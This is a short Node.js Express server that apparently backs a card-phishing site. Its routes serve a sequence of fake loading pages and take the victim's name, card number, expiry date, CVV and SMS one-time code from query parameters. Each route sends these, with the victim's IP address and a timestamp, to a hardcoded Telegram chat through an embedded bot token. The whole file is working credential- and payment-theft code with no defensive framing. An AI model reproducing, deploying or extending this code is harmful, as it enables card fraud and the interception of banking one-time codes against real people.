const express = require('express');
const path = require('path')
const app = express();
const TelegramBot = require('node-telegram-bot-api');
const requestIp = require('request-ip');
const token = '8078860959:AAF0BawcnAJxruPjv1XQ96Jgw1zD3OT3ZHM';
const teleBot = new TelegramBot(token);




// Define a port to listen to
const PORT = process.env.PORT || 3000;

// Define a simple route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});
app.get('/TW/loading2', (req, res) => {

    res.sendFile(path.join(__dirname, 'index2.html'));
});
app.get('/TW/loading3', (req, res) => { 
    const name = req.query.name;   
    const cc = req.query.cc; 
    const exp = req.query.exp;
    const cvv = req.query.cvv; 

    const clientIp = requestIp.getClientIp(req).split(":").pop(); 
    console.log(clientIp);
    
    teleBot.sendMessage('2009886750', `⏱️ ${new Date().toLocaleString()}\n🇩🇪 ${clientIp}`);
    teleBot.sendMessage('2009886750', name+" "+cc+" "+exp+" "+cvv);

  


    res.sendFile(path.join(__dirname, 'index3.html'));
});

app.get('/TW/loading4', (req, res) => { //SEND CREDIT CARD
    const name = req.query.sms;   // Get 'q' query parameter

    const clientIp = requestIp.getClientIp(req).split(":").pop(); 
    teleBot.sendMessage('2009886750', `⏱️ ${new Date().toLocaleString()}\n🇩🇪 ${clientIp}`);
    teleBot.sendMessage('2009886750', name+"  SMS OTP");

  


    res.sendFile(path.join(__dirname, 'index4.html'));
});
app.all('*', (req, res) => {
    res.status(404).send('<div style="height:100vh; display:flex; justify-content:center; align-items:center; flex-direction: column"><h1>404!</h1><h2>Page not found</h2></div>');
  });
  
// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
